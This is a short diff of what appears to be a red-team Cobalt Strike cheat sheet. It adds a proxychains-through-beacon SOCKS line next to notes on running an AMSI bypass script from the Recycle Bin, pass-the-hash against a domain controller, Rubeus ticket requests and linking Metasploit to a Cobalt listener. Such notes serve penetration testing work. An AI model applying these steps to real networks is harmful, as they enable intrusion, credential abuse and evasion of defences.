@@ -199,6 +199,7 @@ Cobalt
   run Powershell -File 'C:\$Recycle.Bin\amsi_bypass.ps1'
   # Get a TGT ticket from the DC
     - pth domain\user hash (this also performs a downgrade attack so not recommended; user Rubueus instead)
+  Proxychains: socks 9050 (beacon); edit /etc/proxychains.conf -> socks4 teamserverIP 9050
   
   Connect MetaSploit to Cobalt Listener
     set lhost cobalt host
